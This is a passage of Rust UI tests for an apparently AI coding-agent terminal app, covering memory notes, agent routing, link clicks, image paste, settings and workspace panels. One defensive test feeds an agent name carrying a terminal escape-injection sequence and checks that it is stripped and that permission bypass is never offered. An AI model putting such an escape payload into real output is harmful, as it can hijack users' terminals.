// ---- `#` memory prompt ------------------------------------------------------------------

fn with_memory_files() -> App {
    let mut a = app();
    a.set_memory_files("/home/u/.synt/AGENTS.md".into(), "/work/p/AGENTS.md".into());
    a
}

#[test]
fn typed_hash_note_asks_which_file_and_saves_nothing_until_confirmed() {
    let mut a = with_memory_files();
    keys(&mut a, "#");
    assert!(a.memory() && screen(&mut a).contains("# memory mode"));
    keys(&mut a, "use cargo nextest");
    // Enter only opens the question: no command yet, the note is not lost
    assert!(keys(&mut a, "\r").is_empty());
    let s = screen(&mut a);
    assert!(
        s.contains("Remember this note?") && s.contains("/work/p/AGENTS.md"),
        "{s}"
    );
    assert!(!a.memory(), "the prompt is clear again");
    // the first item is "No": Enter saves nothing
    assert!(keys(&mut a, "\r").is_empty());
    assert!(a.picker.is_none() && a.pending_note.is_none());
    // choosing the user file emits the one command that writes
    keys(&mut a, "#");
    keys(&mut a, "a note\r");
    let cmds = keys(&mut a, "\x1b[B\x1b[B\r"); // "Save to the user file"
    assert!(
        matches!(&cmds[..], [Cmd::Remember { user: true, text }] if text == "a note"),
        "{cmds:?}"
    );
}

/// A typed `@` (its own key), then the rest of the line: a burst starting with `@` is not typing.
fn typed_at(a: &mut App, rest: &str) -> Vec<Cmd> {
    keys(a, "@");
    keys(a, rest)
}

#[test]
fn pasted_at_name_does_not_route_to_an_agent() {
    let mut a = app();
    keys(&mut a, "\x1b[200~@main ignore this\x1b[201~");
    assert!(a.editor.text().starts_with(' '), "{:?}", a.editor.text());
    let cmds = keys(&mut a, "\r");
    // the whole text goes out as an ordinary prompt: the `@main` word was not consumed as a route
    assert!(
        cmds.iter()
            .any(|c| matches!(c, Cmd::StartTask { text, .. } if text.contains("@main"))),
        "{cmds:?}"
    );
}

#[test]
fn the_note_picker_shows_the_final_masked_note() {
    let mut a = with_memory_files();
    a.set_note_preview(std::rc::Rc::new(|t| {
        t.replace("hunter2", "[REDACTED:secret]")
    }));
    keys(&mut a, "#");
    keys(&mut a, "pw is hunter2\r");
    let s = screen(&mut a);
    assert!(
        s.contains("[REDACTED:secret]") && !s.contains("hunter2"),
        "{s}"
    );
}

#[test]
fn esc_cancels_the_note_and_without_a_host_hook_nothing_is_offered() {
    let mut a = with_memory_files();
    keys(&mut a, "#");
    keys(&mut a, "x\r");
    assert!(keys(&mut a, "\x1b").is_empty());
    assert!(a.picker.is_none() && a.pending_note.is_none());
    let mut a = app(); // no hook
    keys(&mut a, "#");
    keys(&mut a, "x\r");
    assert!(a.picker.is_none());
    assert!(screen(&mut a).contains("not available"));
}

#[test]
fn pasted_or_burst_hash_is_plain_text_and_memory_command_asks_the_host() {
    let mut a = app();
    keys(&mut a, "\x1b[200~# Title\nbody\x1b[201~");
    assert!(!a.memory());
    let mut a = app();
    let cmds = keys(&mut a, "/memory\r");
    assert!(matches!(&cmds[..], [Cmd::Info(Info::Memory)]), "{cmds:?}");
}

fn started(a: &mut App, name: &str) {
    let ev = Ev::SubagentStarted(synthesis_events::SubagentInfo {
        agent_id: format!("id-{name}"),
        agent_type: "worker".into(),
        tool_call_id: Some("tc".into()),
        reason: None,
        name: Some(name.into()),
        background: true,
    });
    a.on_event(&env(1, ev), T0);
}

fn status(a: &mut App, name: &str, to: &str) {
    let ev = Ev::SubagentStatusChanged {
        agent_id: format!("id-{name}"),
        name: name.into(),
        from: "running".into(),
        to: to.into(),
        reason: None,
    };
    a.on_event(&env(2, ev), T0);
}

#[test]
fn tab_cycles_the_target_and_the_prompt_shows_it() {
    let mut a = app();
    started(&mut a, "w");
    started(&mut a, "v");
    assert!(a.target.is_none());
    keys(&mut a, "\x14"); // ctrl+t
    assert!(
        screen(&mut a).contains("to @w · running"),
        "{}",
        screen(&mut a)
    );
    keys(&mut a, "\x14"); // ctrl+t
    assert!(screen(&mut a).contains("@v · running"));
    keys(&mut a, "\x14"); // ctrl+t
    assert!(a.target.is_none());
}

#[test]
fn lines_follow_the_address_and_the_task_state() {
    let mut a = app();
    started(&mut a, "w");
    status(&mut a, "w", "idle");
    // idle agent, no task: a task driven by that agent
    let c = typed_at(&mut a, "w do it\r");
    assert!(
        matches!(&c[..], [Cmd::StartTask { text, agent: Some(TaskAgent::Existing(n)), .. }] if text == "do it" && n == "w"),
        "{c:?}"
    );
    // a task runs: lines go to the inbox of main or of the agent
    let mut a = app();
    started(&mut a, "w");
    keys(&mut a, "first\r");
    let c = keys(&mut a, "more\r");
    assert!(
        matches!(&c[..], [Cmd::SendTo { to, text }] if to == "main" && text == "more"),
        "{c:?}"
    );
    let c = typed_at(&mut a, "w and this\r");
    assert!(
        matches!(&c[..], [Cmd::SendTo { to, text }] if to == "w" && text == "and this"),
        "{c:?}"
    );
    // a file mention is not routed
    let c = typed_at(&mut a, "README.md hi\r");
    assert!(
        matches!(&c[..], [Cmd::SendTo { to, .. }] if to == "main"),
        "{c:?}"
    );
    // Esc with a background target cancels that agent only
    keys(&mut a, "\x14"); // ctrl+t
    let c = keys(&mut a, "\x1b");
    assert!(matches!(&c[..], [Cmd::CancelAgent(n)] if n == "w"), "{c:?}");
    // @agent:<type> while a task runs waits in the queue
    let c = typed_at(&mut a, "agent:reviewer look\r");
    assert!(c.is_empty());
}

#[test]
fn agent_start_and_unknown_addresses() {
    let mut a = app();
    let c = typed_at(&mut a, "agent:reviewer look\r");
    assert!(
        matches!(&c[..], [Cmd::StartTask { agent: Some(TaskAgent::New(d)), text, .. }] if d == "reviewer" && text == "look"),
        "{c:?}"
    );
    let mut a = app();
    assert!(typed_at(&mut a, "agent:zzz hi\r").is_empty());
    assert!(screen(&mut a).contains("no such agent"));
}

fn press(a: &mut App, (x, y): (u32, u32), button: u32, ctrl: bool, alt: bool) -> Vec<Cmd> {
    a.on_key(
        Key::Mouse {
            x: x + 1,
            y: y + 1,
            button,
            action: MouseAction::Down,
            mods: Mods {
                ctrl,
                alt,
                shift: false,
            },
        },
        T0,
    )
}

fn notice(a: &mut App, text: &str) {
    a.on_event(
        &env(
            40,
            Ev::ModelDelta {
                block_index: 1,
                kind: "text".into(),
                text: text.into(),
            },
        ),
        T0,
    );
}

#[test]
fn click_gestures_open_links_relative_paths_and_report_missing_ones() {
    let d = tempfile::tempdir().unwrap();
    let root = synthesis_core::canonicalize(d.path()).unwrap();
    std::fs::write(root.join("notes.txt"), "x").unwrap();
    let mut a = App::new(cfg(&root.to_string_lossy()), &[], T0);
    streamed(&mut a);
    notice(
        &mut a,
        "see https://example.com/x then Update(notes.txt:3) or gone/away.rs ok",
    );
    let url = find_cell(&mut a, "https://example.com/x", 3);
    let rel = find_cell(&mut a, "notes.txt:3", 2);
    let gone = find_cell(&mut a, "gone/away.rs", 2);
    let is_url =
        |c: &[Cmd]| matches!(c, [Cmd::Open(OpenTarget::Url(u))] if u == "https://example.com/x");
    let is_file = |c: &[Cmd]| matches!(c, [Cmd::Open(OpenTarget::RevealFile(p))] if *p == root.join("notes.txt"));
    // (button, ctrl, alt) that open: ctrl+left, alt+left, any right click (macOS ctrl+click)
    for (button, ctrl, alt) in [
        (0, true, false),
        (0, false, true),
        (2, false, false),
        (2, true, false),
    ] {
        assert!(
            is_url(&press(&mut a, url, button, ctrl, alt)),
            "{button} {ctrl} {alt}"
        );
        assert!(
            is_file(&press(&mut a, rel, button, ctrl, alt)),
            "{button} {ctrl} {alt}"
        );
    }
    // a plain left click and a middle click never open
    assert!(press(&mut a, url, 0, false, false).is_empty());
    assert!(press(&mut a, url, 1, true, false).is_empty());
    // a path that does not exist: a notice with ctrl / right click, nothing opened
    assert!(press(&mut a, gone, 0, true, false).is_empty());
    assert!(
        screen(&mut a).contains("✗ not found gone/away.rs"),
        "{}",
        screen(&mut a)
    );
    // alt+click on such text stays a selection click (no notice, no open)
    a.toast("", T0, false);
    assert!(press(&mut a, gone, 0, false, true).is_empty());
    assert!(!screen(&mut a).contains("not found"));
}

#[test]
fn a_url_wrapped_over_rows_opens_from_any_row_and_hover_hints() {
    let mut a = app();
    streamed(&mut a);
    let url = format!("https://example.com/{}", "a".repeat(150));
    notice(&mut a, &format!("see {url} end"));
    let (x, y) = find_cell(&mut a, "https://example.com/", 3);
    for dy in [0, 1] {
        let c = press(&mut a, (x, y + dy), 0, true, false);
        assert!(
            matches!(&c[..], [Cmd::Open(OpenTarget::Url(u))] if *u == url),
            "row +{dy}: {c:?}"
        );
    }
    // motion without a button over the link hints, over plain text does not
    let motion = |a: &mut App, x: u32, y: u32| {
        a.on_key(
            Key::MouseDrag {
                x: x + 1,
                y: y + 1,
                button: 3,
                mods: Mods::default(),
            },
            T0,
        )
    };
    motion(&mut a, x, 0);
    assert!(!screen(&mut a).contains("ctrl+click to open"));
    motion(&mut a, x, y);
    assert!(screen(&mut a).contains("ctrl+click to open"));
}

#[test]
fn mouse_debug_shows_what_the_terminal_sent() {
    let mut c = cfg("/tmp/proj");
    c.mouse_debug = true;
    let mut a = App::new(c, &[], T0);
    streamed(&mut a);
    press(&mut a, (5, 5), 2, false, false);
    assert!(
        screen(&mut a).contains("mouse Down button=2 ctrl=false alt=false shift=false @6,6"),
        "{}",
        screen(&mut a)
    );
}

#[test]
fn a_resumed_notice_is_not_shown_again_as_a_startup_note() {
    let text = "unsandboxed_by_request: --sandbox off";
    let replay = [env(
        1,
        Ev::Notice {
            level: "warning".into(),
            text: text.into(),
        },
    )];
    let mut a = App::new(cfg("/tmp/proj"), &replay, T0);
    a.startup_notes(&[text.to_string(), "another note".to_string()]);
    let notes: Vec<&str> = a
        .chat
        .agent
        .items
        .iter()
        .filter(|i| i.kind == "note")
        .map(|i| i.text.as_str())
        .collect();
    assert_eq!(notes, [text, "another note"]);
    // the live Notice that follows is still swallowed once
    a.on_event(
        &env(
            2,
            Ev::Notice {
                level: "warning".into(),
                text: text.into(),
            },
        ),
        T0,
    );
    assert_eq!(
        a.chat
            .agent
            .items
            .iter()
            .filter(|i| i.kind == "note")
            .count(),
        2
    );
}

#[test]
fn skills_and_mcp_prompts_are_listed_in_help_and_never_shadow_a_built_in() {
    use synthesis_tui_base::complete::Command;
    assert!(is_local_command("help") && is_local_command("quit") && !is_local_command("ship"));
    let mut c = cfg("/tmp/proj");
    c.extra_commands = vec![Command {
        name: "ship".into(),
        aliases: vec![],
        description: "skill: Ship the release".into(),
        argument_hint: String::new(),
        local: false,
    }];
    let mut a = App::new(c, &[], T0);
    keys(&mut a, "/help\r");
    let s = screen(&mut a);
    assert!(s.contains("/ship") && s.contains("Ship the release"), "{s}");
}

#[test]
fn allow_always_never_carries_a_switch_into_bypass_and_the_agent_name_is_sanitised() {
    let mut a = app();
    let sugg = vec![
        Suggestion::SetMode(Mode::BypassPermissions),
        Suggestion::SetMode(Mode::AcceptEdits),
    ];
    let (mut q, mut rx) = ask("Bash", json!({"command": "ls"}), sugg);
    q.req.agent_id = Some("evil\x1b]0;pwn\x07".into());
    a.on_approval(q, T0 - ARM_MS);
    let raw = a.render(COLS, ROWS, T0 - ARM_MS).join("\n");
    assert!(
        !raw.contains("\x1b]0;"),
        "agent name reached the terminal raw"
    );
    assert!(
        !screen(&mut a).contains("bypass"),
        "bypass must not be offered"
    );
    keys(&mut a, "\x1b[B\r"); // allow always
    assert_eq!(
        rx.try_recv().unwrap().accepted,
        [Suggestion::SetMode(Mode::AcceptEdits)]
    );
}

fn clip(base64_len: usize) -> synthesis_tui_base::imgclip::ClipImage {
    synthesis_tui_base::imgclip::ClipImage {
        png: vec![0; 10],
        width: 2,
        height: 2,
        base64: "A".repeat(base64_len),
    }
}

fn pastes(cmds: &[Cmd]) -> usize {
    cmds.iter()
        .filter(|c| matches!(c, Cmd::PasteImage { .. }))
        .count()
}

#[test]
fn key_repeat_starts_one_clipboard_read_and_the_cap_is_checked_before_spawning() {
    let mut a = app();
    // alt+v held down: one read until its answer comes back
    assert_eq!(pastes(&keys(&mut a, "\x1bv")), 1);
    assert_eq!(pastes(&keys(&mut a, "\x1bv")), 0);
    assert_eq!(pastes(&keys(&mut a, "\x1bv")), 0);
    a.attach_image(clip(100), T0);
    for _ in 0..4 {
        assert_eq!(pastes(&keys(&mut a, "\x1bv")), 1);
        a.attach_image(clip(100), T0);
    }
    // five are attached: no sixth read is started at all
    assert_eq!(pastes(&keys(&mut a, "\x1bv")), 0);
    assert!(
        screen(&mut a).contains("at most 5 images"),
        "{}",
        screen(&mut a)
    );
    // ctrl+v (text fallback) is guarded the same way, and a finished read frees the key
    let mut b = app();
    assert_eq!(pastes(&keys(&mut b, "\x16")), 1);
    assert_eq!(pastes(&keys(&mut b, "\x16")), 0);
    b.image_done();
    assert_eq!(pastes(&keys(&mut b, "\x16")), 1);
}

#[test]
fn images_of_one_message_stay_under_the_stores_message_limit() {
    let mut a = app();
    a.attach_image(clip(4 << 20), T0);
    assert_eq!(a.attachments.len(), 1);
    // 4 + 3 MB of base64 would be over the 6 MB total (the store refuses 8 MiB per message)
    a.attach_image(clip(3 << 20), T0);
    assert_eq!(a.attachments.len(), 1, "the second image was not attached");
    let note = a.chat.agent.items.last().unwrap().text.clone();
    assert!(
        note.contains("image not attached") && note.contains("4.0 MB") && note.contains("6.0 MB"),
        "{note}"
    );
    a.attach_image(clip(1 << 20), T0);
    assert_eq!(a.attachments.len(), 2);
}

#[test]
fn an_empty_paste_starts_the_image_read_text_does_not_and_images_can_be_removed() {
    let mut a = app();
    let paste = |a: &mut App, t: &str| {
        a.on_key(Key::Paste(t.into()), T0)
            .into_iter()
            .filter(|c| {
                matches!(
                    c,
                    Cmd::PasteImage {
                        fallback_text: false
                    }
                )
            })
            .count()
    };
    assert_eq!(
        paste(&mut a, ""),
        1,
        "an empty paste event is the image paste"
    );
    a.image_done();
    assert_eq!(paste(&mut a, "some text"), 0);
    assert_eq!(a.editor.chars.iter().collect::<String>(), "some text");
    for _ in 0.."some text".len() {
        keys(&mut a, "\x7f");
    }
    a.attach_image(clip(10), T0);
    a.attach_image(clip(10), T0);
    assert_eq!(a.attachments.len(), 2);
    keys(&mut a, "\x7f"); // empty prompt: drops the last chip
    assert_eq!(a.attachments.len(), 1);
    keys(&mut a, "x");
    keys(&mut a, "\x7f"); // text in the prompt: backspace edits the text
    assert_eq!(a.attachments.len(), 1);
    keys(&mut a, "/images\r");
    assert!(
        screen(&mut a).contains("attached: image 1.png"),
        "{}",
        screen(&mut a)
    );
    keys(&mut a, "/images clear\r");
    assert!(a.attachments.is_empty());
    assert!(screen(&mut a).contains("1 attached image(s) dropped"));
}

#[test]
fn config_rows_flip_apply_at_once_and_ask_the_host_to_save() {
    let mut a = app();
    keys(&mut a, "/config\r");
    let s = screen(&mut a);
    assert!(
        s.contains("Settings (synt.tui)") && s.contains("[x] panel session"),
        "{s}"
    );
    // enter flips the first row (the Session panel) and asks for a save of exactly that state
    let c = keys(&mut a, "\r");
    let saved: Vec<_> = c
        .iter()
        .filter_map(|c| match c {
            Cmd::SaveTui(t) => Some(*t),
            _ => None,
        })
        .collect();
    assert_eq!(saved.len(), 1);
    assert!(!saved[0].panels[0] && saved[0].panels[1..].iter().all(|p| *p));
    assert!(!a.tui.panels[0], "applied without a restart");
    assert!(screen(&mut a).contains("[ ] panel session"));
    // the cursor stayed on its row: another enter flips it back
    let c = keys(&mut a, "\r");
    assert!(matches!(&c[..], [Cmd::SaveTui(t)] if t.panels[0]));
}

#[test]
fn settings_change_what_is_drawn() {
    let mut a = app();
    let t = synthesis_settings::TuiSettings {
        logo: false,
        panels: [false, true, false, false],
        ..Default::default()
    };
    a.set_tui(
        t,
        &["synt.tui.motion must be true or false, kept".to_string()],
    );
    let s = screen(&mut a);
    assert!(!s.contains("◆ Session") && !s.contains("◆ Activity"), "{s}");
    assert!(
        s.contains("synt.tui.motion must be"),
        "a bad setting is told: {s}"
    );
    // diffs_expanded is the ctrl+o state from the start
    let t = synthesis_settings::TuiSettings {
        diffs_expanded: true,
        ..Default::default()
    };
    let mut b = app();
    b.set_tui(t, &[]);
    assert!(b.expanded);
}

#[test]
fn files_and_diff_need_a_trusted_folder_and_never_run_two_scans_at_once() {
    let mut c = cfg("/tmp/proj");
    c.project_trusted = false;
    let mut a = App::new(c, &[], T0);
    for cmd in ["/files\r", "/diff\r"] {
        let out = keys(&mut a, cmd);
        assert!(
            !out.iter().any(|c| matches!(c, Cmd::Project { .. })),
            "git was asked for in an untrusted folder"
        );
    }
    assert!(screen(&mut a).contains("not trusted"));
    let mut b = app();
    let started = |b: &mut App, s: &str| {
        keys(b, s)
            .iter()
            .filter(|c| matches!(c, Cmd::Project { .. }))
            .count()
    };
    assert_eq!(started(&mut b, "/files\r"), 1);
    assert_eq!(started(&mut b, "/diff\r"), 0, "one scan at a time");
    assert!(screen(&mut b).contains("still running"));
    b.project_done();
    assert_eq!(started(&mut b, "/diff x\r"), 1);
}

/// Ctrl+N with a typed query: `Some(folder)` when Enter started a session, else the picker text.
fn new_folder_typed(cwd: &Path, home: Option<&Path>, typed: &str) -> (Option<PathBuf>, String) {
    let mut c = cfg(&cwd.to_string_lossy());
    c.home = home.map(Path::to_path_buf);
    let mut a = App::new(c, &[], T0);
    keys(&mut a, "\x0e"); // ctrl+n: new workspace
    keys(&mut a, typed);
    let shown = screen(&mut a);
    keys(&mut a, "\r");
    match a.quit.clone() {
        Some(ExitReason::OpenFolder(p)) => (Some(p), shown),
        _ => (None, screen(&mut a)),
    }
}

#[test]
fn new_folder_a_typed_query_never_falls_back_to_the_current_folder() {
    let d = tempfile::tempdir().unwrap();
    let cwd = d.path().join("here");
    std::fs::create_dir_all(&cwd).unwrap();
    // the current path is in the detail column of `use this folder`: it must not match
    let (got, text) = new_folder_typed(&cwd, None, "bad");
    assert!(got.is_none(), "{text}");
    assert!(text.contains("no matches"), "{text}");
}

#[test]
fn new_folder_typed_paths_open_a_folder_or_say_why_not() {
    let d = tempfile::tempdir().unwrap();
    let root = std::fs::canonicalize(d.path()).unwrap();
    let cwd = root.join("here");
    for sub in ["here/sub", "home/x", "my dir é"] {
        std::fs::create_dir_all(root.join(sub)).unwrap();
    }
    std::fs::write(root.join("here/afile"), "x").unwrap();
    let home = root.join("home");
    let open = |q: &str| new_folder_typed(&cwd, Some(&home), q);
    // relative to the session's folder, `~`, absolute, spaces and non-ASCII
    assert_eq!(open("./sub").0, Some(cwd.join("sub")));
    assert_eq!(open("~/x").0, Some(home.join("x")));
    assert_eq!(open("../my dir é").0, Some(root.join("my dir é")));
    assert_eq!(
        open(&root.join("my dir é").to_string_lossy()).0,
        Some(root.join("my dir é"))
    );
    // a file, a missing path
    let (got, text) = open("./afile");
    assert!(got.is_none() && text.contains("not a folder"), "{text}");
    let (got, text) = open("./nope");
    assert!(got.is_none() && text.contains("no such folder"), "{text}");
    // a folder nobody may read
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let locked = root.join("here/locked");
        std::fs::create_dir_all(&locked).unwrap();
        std::fs::set_permissions(&locked, std::fs::Permissions::from_mode(0o000)).unwrap();
        let (got, text) = open("./locked");
        std::fs::set_permissions(&locked, std::fs::Permissions::from_mode(0o755)).unwrap();
        // root can read anything: only assert where the mode is enforced
        if std::fs::read_dir(&locked).is_ok() && got.is_some() {
            return;
        }
        // the card may wrap the message: compare without borders and line breaks
        let flat = text.replace(['│', '┃'], " ");
        assert!(
            got.is_none()
                && flat
                    .split_whitespace()
                    .collect::<Vec<_>>()
                    .join(" ")
                    .contains("permission denied"),
            "{text}"
        );
    }
}

#[cfg(unix)]
#[test]
fn new_folder_lists_symlinked_folders_with_a_marker() {
    let d = tempfile::tempdir().unwrap();
    let cwd = std::fs::canonicalize(d.path()).unwrap();
    std::fs::create_dir_all(cwd.join("real")).unwrap();
    std::os::unix::fs::symlink(cwd.join("real"), cwd.join("lnk")).unwrap();
    // a loop is just a link to a folder: one level per listing, no recursion
    std::os::unix::fs::symlink(&cwd, cwd.join("loop")).unwrap();
    let mut a = App::new(cfg(&cwd.to_string_lossy()), &[], T0);
    keys(&mut a, "\x0e"); // ctrl+n: new workspace
    let text = screen(&mut a);
    assert!(
        text.contains("lnk/ (link)") && text.contains("real/"),
        "{text}"
    );
}

#[test]
fn permissions_allow_rejects_a_malformed_rule() {
    use synthesis_permissions::Permissions;
    for bad in ["((", "", "Bash(", "a b", "Bash(x)\n"] {
        assert!(!Permissions::is_well_formed_rule(bad), "{bad:?}");
    }
    for ok in ["Edit", "Bash(cargo test:*)", "mcp__srv__tool"] {
        assert!(Permissions::is_well_formed_rule(ok), "{ok}");
    }
}

#[test]
fn resume_toggle_to_this_folder_says_so_when_it_has_no_sessions() {
    let mut a = app(); // the only saved session is in /work/other
    keys(&mut a, "/resume\r");
    keys(&mut a, "only this");
    keys(&mut a, "\r");
    let text = screen(&mut a);
    assert!(text.contains("no saved sessions in this folder"), "{text}");
}

#[test]
fn a_long_folder_name_is_shortened_in_the_narrow_header_not_dropped() {
    let mut a = App::new(cfg("/tmp/a-very-long-project-folder-name"), &[], T0);
    let rows = a.render(80, 24, T0);
    let head = strip_ansi(&rows[0]);
    assert!(head.contains('⌂') && head.contains('…'), "{head}");
}

// ---------------------------------------------------------------- workspace / running / activity

fn saved(id: &str, cwd: &str, title: &str, mtime: i64) -> SavedSession {
    SavedSession {
        id: id.into(),
        cwd: cwd.into(),
        title: title.into(),
        updated_at: String::new(),
        mtime,
    }
}

/// Live `sess-1` in /tmp/proj; stored: two sessions in /w/a, one in /w/b, one more in /tmp/proj.
fn multi_app() -> App {
    let mut c = cfg("/tmp/proj");
    c.saved = vec![
        saved("a-old", "/w/a", "alpha old", 5),
        saved("b-1", "/w/b", "beta", 7),
        saved("a-new", "/w/a", "alpha new", 9),
        saved("p-1", "/tmp/proj", "earlier here", 3),
        saved("sess-1", "/tmp/proj", "the live one, also stored", 11),
    ];
    App::new(c, &[], T0)
}

fn tap(a: &mut App, x: i64, y: i64) -> Vec<Cmd> {
    a.on_key(
        Key::Mouse {
            x: x as u32 + 1,
            y: y as u32 + 1,
            button: 0,
            action: MouseAction::Down,
            mods: Mods::default(),
        },
        T0,
    )
}

/// The Activity panel only fits on a tall terminal.
fn big(a: &mut App) -> String {
    a.render(160, 48, T0)
        .iter()
        .map(|l| strip_ansi(l).trim_end().to_string())
        .collect::<Vec<_>>()
        .join("\n")
}

fn wheel(a: &mut App, x: i64, y: i64, dir: WheelDir) {
    a.on_key(
        Key::Wheel {
            dir,
            x: x as u32 + 1,
            y: y as u32 + 1,
            mods: Mods::default(),
        },
        T0,
    );
}

fn prompts(a: &mut App, n: usize) {
    for i in 0..n {
        let ev = Ev::UserMessage {
            text: format!("prompt number {i}"),
            display_text: None,
            images: vec![],
        };
        a.on_event(&env(i as u64 + 1, ev), T0);
    }
}

#[test]
fn workspaces_are_grouped_live_first_then_newest_and_the_live_session_is_not_listed_twice() {
    let a = multi_app();
    let keys: Vec<&str> = a.groups.iter().map(|g| g.cwd.as_str()).collect();
    assert_eq!(keys, ["/tmp/proj", "/w/a", "/w/b"]);
    let ids = |g: &panels::Group| g.sessions.iter().map(|s| s.id.clone()).collect::<Vec<_>>();
    assert_eq!(ids(&a.groups[0]), ["p-1"], "the live id is dropped");
    assert_eq!(ids(&a.groups[1]), ["a-new", "a-old"], "newest first");
    // a workspace with nothing stored still exists when it is the live one
    let b = App::new(cfg("/tmp/empty"), &[], T0);
    assert_eq!(b.groups.len(), 2);
    assert_eq!(b.groups[0].cwd, "/tmp/empty");
}

#[test]
fn clicking_a_workspace_lists_its_sessions_and_clicking_a_session_resumes_it() {
    let mut a = multi_app();
    let s = screen(&mut a);
    assert!(
        s.contains("Workspace 3") && s.contains("earlier here"),
        "{s}"
    );
    let r = a.frame.as_ref().unwrap().rects.clone();
    assert_eq!(r.workspace_rows.len(), 3, "{:?}", r.workspace_rows);
    // the second workspace row: /w/a
    let (y, _) = r.workspace_rows[1].clone();
    assert!(tap(&mut a, 3, y).is_empty());
    assert_eq!(a.ws_sel, 1);
    assert_eq!(a.side, Focus::Dashboard);
    let s = screen(&mut a);
    assert!(s.contains("alpha new") && s.contains("alpha old"), "{s}");
    assert!(!s.contains("earlier here"), "{s}");
    assert!(
        s.contains("1 live"),
        "the header still counts the live session: {s}"
    );
    // its second session
    let r = a.frame.as_ref().unwrap().rects.clone();
    let (y, id) = r.session_rows.last().cloned().unwrap();
    assert_eq!(id, "a-old");
    tap(&mut a, 3, y);
    assert_eq!(a.quit, Some(ExitReason::Resume("a-old".into())));
}

#[test]
fn clicking_the_live_session_only_moves_the_focus_back_and_a_running_task_needs_a_second_click() {
    let mut a = multi_app();
    screen(&mut a);
    let live_y = a.frame.as_ref().unwrap().rects.session_rows[0].0;
    a.side = Focus::Dashboard;
    tap(&mut a, 3, live_y);
    assert!(a.quit.is_none());
    assert_eq!(a.side, Focus::Agent);
    // another session while a task runs: the first click asks, the second one switches
    keys(&mut a, "work\r");
    assert!(a.running());
    let y = a.frame.as_ref().unwrap().rects.session_rows[2].0;
    tap(&mut a, 3, y);
    assert!(a.quit.is_none() && a.toast.is_some());
    tap(&mut a, 3, y);
    assert_eq!(a.quit, Some(ExitReason::Resume("p-1".into())));
}

#[test]
fn tab_walks_chat_workspace_running_chat_and_only_from_an_empty_prompt_without_dialogs() {
    let mut a = multi_app();
    screen(&mut a);
    keys(&mut a, "\t");
    assert_eq!(a.side, Focus::Workspace);
    assert!(a.chat.agents.is_empty());
    keys(&mut a, "\t");
    assert_eq!(a.side, Focus::Dashboard);
    keys(&mut a, "\t");
    assert_eq!(a.side, Focus::Agent);
    // the focused panel shows it: its border takes the accent colour
    let off = a.render(COLS, ROWS, T0)[2].clone();
    keys(&mut a, "\t");
    let lit = a.render(COLS, ROWS, T0)[2].clone();
    assert_ne!(lit, off);
    let accent = synthesis_tui_render::theme::paint(synthesis_tui_render::theme::T_CLAUDE, "┏━");
    assert!(lit.contains(&accent) && !off.contains(&accent), "{lit:?}");
    // Esc, typing, Shift+Tab: back in the chat (Shift+Tab still cycles the mode)
    keys(&mut a, "\x1b");
    assert_eq!(a.side, Focus::Agent);
    keys(&mut a, "\t");
    keys(&mut a, "x");
    assert_eq!((a.side, a.editor.text().as_str()), (Focus::Agent, "x"));
    // a prompt with text: Tab is not ours
    keys(&mut a, "\t");
    assert_eq!(a.side, Focus::Agent);
    a.editor.clear();
    // a dialog open: neither Tab nor a click reaches the panels
    let (ask1, _rx) = ask("Bash", json!({"command": "ls"}), vec![]);
    a.on_approval(ask1, T0);
    keys(&mut a, "\t");
    assert_eq!(a.side, Focus::Agent);
}

#[test]
fn ctrl_t_cycles_the_agent_target_only_when_there_are_agents() {
    let mut a = multi_app();
    keys(&mut a, "\x14");
    assert!(a.target.is_none() && !screen(&mut a).contains("now talking"));
    started(&mut a, "w");
    keys(&mut a, "\x14");
    assert_eq!(a.target.as_deref(), Some("w"));
    keys(&mut a, "\t");
    assert_eq!(
        a.target.as_deref(),
        Some("w"),
        "tab no longer cycles the target"
    );
}

#[test]
fn panel_keys_move_the_selection_enter_opens_and_text_goes_back_to_the_chat() {
    let mut a = multi_app();
    screen(&mut a);
    keys(&mut a, "\t\x1b[B"); // workspace panel, down
    assert_eq!(a.ws_sel, 1);
    keys(&mut a, "\x1b[F"); // end
    assert_eq!(a.ws_sel, 2);
    keys(&mut a, "\x1b[H\x1b[A"); // home, up: clamped
    assert_eq!(a.ws_sel, 0);
    keys(&mut a, "\x1b[B\r"); // enter: its sessions get the keys
    assert_eq!((a.ws_sel, a.side), (1, Focus::Dashboard));
    keys(&mut a, "\x1b[B\r"); // second session of /w/a
    assert_eq!(a.quit, Some(ExitReason::Resume("a-old".into())));
}

#[test]
fn new_session_opens_the_selected_workspace_and_ctrl_n_still_picks_a_folder() {
    let mut a = multi_app();
    keys(&mut a, "/new\r");
    assert_eq!(a.quit, Some(ExitReason::OpenFolder("/tmp/proj".into())));
    let mut a = multi_app();
    a.select_ws(2);
    keys(&mut a, "/new\r");
    assert_eq!(a.quit, Some(ExitReason::OpenFolder("/w/b".into())));
    let mut a = multi_app();
    keys(&mut a, "\x0e");
    assert!(a.picker.is_some() && a.quit.is_none());
}

#[test]
fn the_wheel_scrolls_the_panel_under_it_clamped_and_leaves_the_rest_alone() {
    let mut a = multi_app();
    prompts(&mut a, 80);
    big(&mut a);
    let r = a.frame.as_ref().unwrap().rects.clone();
    let act = r.activity_rect.expect("activity panel at 120x40");
    assert!(r.activity_max_scroll > 0);
    let (ax, ay) = (act.x + 2, act.y + 2);
    for _ in 0..500 {
        wheel(&mut a, ax, ay, WheelDir::Up);
    }
    assert_eq!(a.act_scroll, r.activity_max_scroll, "clamped at the oldest");
    assert_eq!(a.scroll, 0, "the chat did not move");
    big(&mut a);
    assert_eq!(
        a.frame.as_ref().unwrap().rects.activity_hits[0].1,
        0,
        "the oldest row is shown"
    );
    for _ in 0..500 {
        wheel(&mut a, ax, ay, WheelDir::Down);
    }
    assert_eq!(a.act_scroll, 0);
    // Workspace panel: moves the selection and stops at the ends
    let w = r.workspace_rect.unwrap();
    wheel(&mut a, w.x + 2, w.y + 1, WheelDir::Down);
    wheel(&mut a, w.x + 2, w.y + 1, WheelDir::Down);
    wheel(&mut a, w.x + 2, w.y + 1, WheelDir::Down);
    assert_eq!(a.ws_sel, 2);
    // Running panel (back on the workspace with two sessions)
    a.select_ws(0);
    let q = r.session_rect.unwrap();
    wheel(&mut a, q.x + 2, q.y + 1, WheelDir::Down);
    assert_eq!(a.run_sel, 1);
    wheel(&mut a, q.x + 2, q.y + 1, WheelDir::Up);
    wheel(&mut a, q.x + 2, q.y + 1, WheelDir::Up);
    assert_eq!(a.run_sel, 0);
    // elsewhere in the sidebar (the header row): nothing
    let before = (a.ws_sel, a.run_sel, a.act_scroll, a.scroll);
    wheel(&mut a, 2, 0, WheelDir::Down);
